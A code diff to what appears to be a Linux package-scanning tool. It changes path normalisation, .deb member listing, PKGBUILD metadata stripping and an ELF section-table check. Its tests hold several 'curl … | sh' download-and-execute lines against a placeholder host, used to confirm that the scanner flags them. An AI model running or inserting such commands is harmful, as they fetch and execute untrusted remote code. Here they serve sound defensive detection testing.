@@ -314,8 +314,14 @@ pub fn assess(r: &mut Report, p: &Package) {
 }
 
 /// Install-time absolute path from an archive member name like `./usr/bin/x`.
+/// Empty and `.` components are dropped, as the package manager drops them, so
+/// `.//etc/./cron.d/x` is matched as `/etc/cron.d/x`.
 fn absolute(name: &str) -> String {
-    format!("/{}", name.trim_start_matches("./").trim_start_matches('/'))
+    let parts: Vec<&str> = name
+        .split('/')
+        .filter(|p| !p.is_empty() && *p != ".")
+        .collect();
+    format!("/{}", parts.join("/"))
 }
 
 /// `ar` members as (name, offset, size).
@@ -348,22 +354,6 @@ fn ar_members(file: &mut File) -> Result<Vec<(String, u64, u64)>> {
     Ok(out)
 }
 
-/// Lists one compressed tar member of a .deb by copying it to a private file.
-fn deb_member(
-    file: &mut File,
-    offset: u64,
-    size: u64,
-    stop: &Cancel,
-    want: &Want,
-) -> Result<archive::Listing> {
-    let dir = tempfile::tempdir()?;
-    let path = dir.path().join("member");
-    file.seek(SeekFrom::Start(offset))?;
-    std::io::copy(&mut file.by_ref().take(size), &mut File::create(&path)?)?;
-    let format = archive::format_of(&path).context("Unknown compression inside the .deb")?;
-    archive::list_with(&path, format, stop, want)
-}
-
 const DEB_CONTROL: Want = Want {
     entry: |name| {
         matches!(
@@ -371,10 +361,12 @@ const DEB_CONTROL: Want = Want {
             "control" | "preinst" | "postinst" | "prerm" | "postrm" | "config" | "triggers"
         )
     },
+    names: Vec::new(),
     max: MAX_SCRIPT,
 };
 const NOTHING: Want = Want {
     entry: |_| false,
+    names: Vec::new(),
     max: 0,
 };
 
@@ -397,7 +389,10 @@ fn deb(path: &Path, stop: &Cancel) -> Result<Package> {
         .iter()
         .find(|m| m.0.starts_with("control.tar"))
         .context("The .deb has no control archive")?;
-    for e in deb_member(&mut file, control.1, control.2, stop, &DEB_CONTROL)?.entries {
+    for e in archive::list_part(path, control.1, control.2, stop, &DEB_CONTROL)
+        .context("Cannot list the .deb's control archive")?
+        .entries
+    {
         let Some(text) = e.content else { continue };
         match e.name.trim_start_matches("./") {
             "control" => {
@@ -416,7 +411,8 @@ fn deb(path: &Path, stop: &Cancel) -> Result<Package> {
         .iter()
         .find(|m| m.0.starts_with("data.tar"))
         .context("The .deb has no data archive")?;
-    let listing = deb_member(&mut file, data.1, data.2, stop, &NOTHING)?;
+    let listing = archive::list_part(path, data.1, data.2, stop, &NOTHING)
+        .context("Cannot list the .deb's data archive")?;
     p.truncated = listing.truncated;
     p.files = listing
         .entries
@@ -432,6 +428,7 @@ fn deb(path: &Path, stop: &Cancel) -> Result<Package> {
 
 const ARCH_META: Want = Want {
     entry: |name| name == ".PKGINFO" || name == ".INSTALL",
+    names: Vec::new(),
     max: MAX_SCRIPT,
 };
 
@@ -798,39 +795,71 @@ const METADATA: &[&str] = &[
     "b2sums",
 ];
 
-/// The PKGBUILD with metadata assignments blanked, line numbers kept, so the
-/// installer rules see only what runs.
+/// Where the shell word (or array) assigned at `start` ends, the way bash reads
+/// it: quotes and backslashes are honoured, an array runs to its closing `)`,
+/// and a scalar ends at unquoted whitespace or `;`, `&` or `|`.
+fn value_end(text: &str, start: usize) -> usize {
+    let b = text.as_bytes();
+    let (mut i, mut depth, mut quote) = (start, 0usize, None::<u8>);
+    while i < b.len() {
+        let c = b[i];
+        match quote {
+            Some(b'"') if c == b'\\' => i += 1,
+            Some(q) if c == q => quote = None,
+            Some(_) => {}
+            None => match c {
+                b'\\' => i += 1,
+                b'\'' | b'"' => quote = Some(c),
+                b'(' if depth > 0 || i == start => depth += 1,
+                b')' if depth > 0 => {
+                    depth -= 1;
+                    if depth == 0 {
+                        return i + 1;
+                    }
+                }
+                b'#' if depth > 0 && b[i - 1].is_ascii_whitespace() => {
+                    while i < b.len() && b[i] != b'\n' {
+                        i += 1;
+                    }
+                    continue;
+                }
+                b';' | b'&' | b'|' if depth == 0 => return i,
+                c if depth == 0 && c.is_ascii_whitespace() => return i,
+                _ => {}
+            },
+        }
+        i += 1;
+    }
+    b.len()
+}
+
+/// The PKGBUILD with metadata assignments removed, newlines kept so line numbers
+/// stay right, so the installer rules see only what runs. Only the assigned value
+/// goes: `pkgdesc="x"; curl … | sh` keeps its command, and a value that runs a
+/// command itself (`$(…)` or backticks) is kept whole.
 fn code(text: &str) -> String {
-    let mut out = vec![];
-    let mut depth: Option<i32> = None;
-    for line in text.lines() {
-        if let Some(d) = depth.as_mut() {
-            *d += line.matches('(').count() as i32 - line.matches(')').count() as i32;
-            if *d <= 0 {
-                depth = None;
-            }
-            out.push("");
+    static ASSIGN: LazyLock<Regex> = LazyLock::new(|| {
+        Regex::new(r"(?m)^[ \t]*([A-Za-z_][A-Za-z0-9_]*)\+?=").expect("valid regex")
+    });
+    let mut out = String::with_capacity(text.len());
+    let mut at = 0;
+    for cap in ASSIGN.captures_iter(text) {
+        let m = cap.get(0).expect("whole match");
+        let base = cap[1].split('_').next().unwrap_or("");
+        if m.start() < at || !METADATA.contains(&base) {
             continue;
         }
-        let key = line
-            .trim_start()
-            .split(['=', '+'])
-            .next()
-            .unwrap_or("")
-            .trim();
-        let base = key.split('_').next().unwrap_or(key);
-        let assignment = line.contains('=') && !key.contains(char::is_whitespace);
-        if assignment && METADATA.contains(&base) {
-            let open = line.matches('(').count() as i32 - line.matches(')').count() as i32;
-            if open > 0 {
-                depth = Some(open);
-            }
-            out.push("");
-        } else {
-            out.push(line);
+        let end = value_end(text, m.end());
+        let value = &text[m.end()..end];
+        if value.contains("$(") || value.contains('`') {
+            continue;
         }
+        out.push_str(&text[at..m.start()]);
+        out.extend(text[m.start()..end].chars().filter(|c| *c == '\n'));
+        at = end;
     }
-    out.join("\n")
+    out.push_str(&text[at..]);
+    out
 }
 
 /// The PKGBUILD rules over its text and, when given, its install file.
@@ -944,7 +973,7 @@ fn elf_sections(file: &mut File, wanted: &[&str]) -> Result<Vec<(String, Vec<u8>
             le16(&ident, 0x32),
         )
     };
-    if count == 0 || count > 4096 || entsize < if wide { 64 } else { 40 } {
+    if count == 0 || count > 4096 || strndx >= count || entsize < if wide { 64 } else { 40 } {
         bail!("The AppImage's section table is damaged");
     }
     let mut table = vec![0u8; (entsize * count) as usize];
@@ -1125,6 +1154,47 @@ mod tests {
         assert_eq!(r.coverage.checked, ["3 files and 1 install script (deb)"]);
     }
 
+    #[test]
+    fn an_xz_data_member_is_streamed_to_the_isolated_tool() {
+        if !crate::runner::available("bwrap") || !Path::new("/usr/bin/xz").is_file() {
+            eprintln!("skipped: needs bwrap and /usr/bin/xz");
+            return;
+        }
+        let d = tempfile::tempdir().unwrap();
+        let path = d.path().join("fixture_1.0_amd64.deb");
+        let control = tar_gz(&[("./control", 0o644, b"Package: fixture\nVersion: 1.0\n")]);
+        let mut data = tar::Builder::new(vec![]);
+        let mut h = tar::Header::new_gnu();
+        h.set_size(1);
+        h.set_mode(0o644);
+        h.set_path("./etc/cron.d/fixture").unwrap();
+        h.set_cksum();
+        data.append(&h, &b"x"[..]).unwrap();
+        let mut xz = std::process::Command::new("/usr/bin/xz")
+            .args(["-c"])
+            .stdin(std::process::Stdio::piped())
+            .stdout(std::process::Stdio::piped())
+            .spawn()
+            .unwrap();
+        xz.stdin
+            .take()
+            .unwrap()
+            .write_all(&data.into_inner().unwrap())
+            .unwrap();
+        let data = xz.wait_with_output().unwrap().stdout;
+        ar(
+            &path,
+            &[
+                ("debian-binary", b"2.0\n".to_vec()),
+                ("control.tar.gz", control),
+                ("data.tar.xz", data),
+            ],
+        );
+        let p = deb(&path, &crate::runner::cancel()).unwrap();
+        let names: Vec<&str> = p.files.iter().map(|f| f.name.as_str()).collect();
+        assert!(names.contains(&"/etc/cron.d/fixture"), "{names:?}");
+    }
+
     /// An rpm header with the given tags, as rpm lays it out.
     fn header(tags: &[(u32, u32, u32, Vec<u8>)]) -> Vec<u8> {
         let mut index = vec![];
@@ -1237,6 +1307,60 @@ mod tests {
         let mut r = Report::new("t", "t");
         assess_pkgbuild(&mut r, packaging, None);
         assert!(r.findings.is_empty(), "{:?}", rules(&r));
+    }
+
+    #[test]
+    fn code_after_a_metadata_value_is_still_checked() {
+        let runs = |text: &str| {
+            let mut r = Report::new("t", "t");
+            assess_pkgbuild(&mut r, text, None);
+            r.findings
+                .iter()
+                .any(|f| f.rule == "shell.execute-download")
+        };
+        assert!(runs(
+            "pkgdesc=\"tool\"; curl -s https://example.invalid/x | sh\n"
+        ));
+        // An unbalanced bracket inside quotes does not hide the lines after it.
+        assert!(runs(
+            "pkgdesc=\"Tool (beta\"\nbuild() {\n  curl -s https://example.invalid/x | sh\n}\n"
+        ));
+        assert!(runs(
+            "depends=('a' # (\n 'b') && curl -s https://example.invalid/x | sh\n"
+        ));
+        // A value that runs a command is code, not metadata.
+        assert!(runs("pkgver=$(curl -s https://example.invalid/x | sh)\n"));
+        assert!(!runs(
+            "pkgdesc=\"curl -s https://example.invalid/x | sh\"\n"
+        ));
+        let text = "pkgname=x\nsource=('a'\n  'b')\nbuild() {\n  make\n}\n";
+        assert_eq!(code(text), "\n\n\nbuild() {\n  make\n}\n");
+    }
+
+    #[test]
+    fn install_paths_are_normalised() {
+        assert_eq!(absolute("./usr/bin/x"), "/usr/bin/x");
+        assert_eq!(absolute(".//etc/./cron.d//x"), "/etc/cron.d/x");
+        assert_eq!(absolute("./"), "/");
+    }
+
+    #[test]
+    fn a_section_name_index_past_the_table_is_an_error() {
+        let mut f = vec![0u8; 64];
+        f[..4].copy_from_slice(b"\x7fELF");
+        f[4] = 2;
+        f[5] = 1;
+        f[8..11].copy_from_slice(b"AI\x02");
+        f[0x28..0x30].copy_from_slice(&64u64.to_le_bytes());
+        f[0x3a..0x3c].copy_from_slice(&64u16.to_le_bytes());
+        f[0x3c..0x3e].copy_from_slice(&1u16.to_le_bytes());
+        f[0x3e..0x40].copy_from_slice(&0xffffu16.to_le_bytes());
+        f.extend([0u8; 64]);
+        let d = tempfile::tempdir().unwrap();
+        let path = d.path().join("Tool.AppImage");
+        std::fs::write(&path, f).unwrap();
+        let e = appimage(&path).unwrap_err();
+        assert!(format!("{e:#}").contains("damaged"), "{e:#}");
     }
 
     #[test]
